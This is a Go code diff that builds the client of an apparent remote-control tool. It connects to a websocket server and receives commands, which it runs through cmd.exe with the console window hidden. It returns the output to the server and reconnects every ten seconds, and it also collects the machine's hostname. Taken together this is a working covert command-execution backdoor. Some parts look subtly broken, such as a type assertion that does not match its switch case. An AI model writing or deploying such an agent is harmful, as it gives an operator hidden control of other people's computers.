@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net/url"
 	"os"
+	"os/exec"
 	"os/signal"
 	"syscall"
 	"time"
@@ -17,14 +18,62 @@ import (
 var addr = flag.String("addr", "localhost:8080", "http service address")
 
 type Client struct {
-	Ws   *websocket.Conn `json:"-"`
-	Name string          `json:"name"`
-	Info string          `json:"info"`
-
-	Message chan common.Message `json:"-"`
+	*common.Client
 }
 
-var client Client
+func Exec(command string) ([]byte, error) {
+	cmd_path := "C:\\Windows\\system32\\cmd.exe"
+	cmd_instance := exec.Command(cmd_path, "/c", command)
+	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd_output, err := cmd_instance.Output()
+	return cmd_output, err
+}
+
+func (c *Client) runCommand(command string) {
+	//runs the requested command with Exec()
+	//and sends a message back to the server
+
+	output, err := Exec(command)
+	if err != nil {
+		//handle err
+	}
+	message := common.Message{Data: common.CommandData{Command: command, Output: string(output)}}
+	jsonMessage, _ := json.Marshal(message) //this can't error
+	c.SendMessage(jsonMessage)
+}
+
+func (c *Client) HandleMessages() {
+	for {
+		message := <-c.Message
+		fmt.Println(message)
+
+		switch message.Data.(type) {
+		case common.CommandData:
+			fmt.Println("command")
+			data := message.Data.(*common.CommandData)
+			fmt.Println(data)
+			c.runCommand(data.Command)
+		default:
+
+		}
+	}
+}
+
+func (c *Client) SendStats() {
+	//sends the information about this client
+	//such as the pc hostname
+	//and possibly other things
+
+	hostname, _ := os.Hostname()
+	c.Name = hostname
+
+}
+
+func reconnect() {
+	fmt.Println("reconnecting in 10s")
+	time.Sleep(10 * time.Second)
+	go main()
+}
 
 func main() {
 	flag.Parse()
@@ -33,20 +82,27 @@ func main() {
 	signal.Notify(interrupt, os.Interrupt)
 
 	u := url.URL{Scheme: "ws", Host: *addr, Path: "/ws"}
-	fmt.Printf("connecting to %s", u.String())
+	fmt.Printf("connecting to %s\n", u.String())
 
 	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
 	if err != nil {
 		fmt.Println("dial:", err)
-		fmt.Println("reconnecting in 10s")
-		time.Sleep(10 * time.Second)
-		go main()
+		go reconnect()
+		return
 	}
 	defer c.Close()
 
 	done := make(chan struct{})
 
-	client = Client{Ws: c}
+	client := Client{
+		Client: &common.Client{
+			Ws:      c,
+			Message: make(chan common.Message),
+		},
+	}
+
+	go client.HandleMessages()
+	fmt.Println("handle messages goroutine started")
 	go func() {
 		defer close(done)
 		for {
@@ -54,19 +110,16 @@ func main() {
 			if err != nil {
 				fmt.Println("read:", err)
 				// fmt.Printf("%t", err)
-				fmt.Println("reconnecting in 10s")
-				time.Sleep(10 * time.Second)
-				go main()
+				go reconnect()
 				return
 			}
 
 			message := common.Message{}
 			err = json.Unmarshal(msg, &message)
 			if err != nil {
-				fmt.Println("error when converting message to json")
+				fmt.Println("failed to convert message to struct")
 			}
 			client.Message <- message
-			fmt.Printf("recv: %s", msg)
 		}
 	}()
 
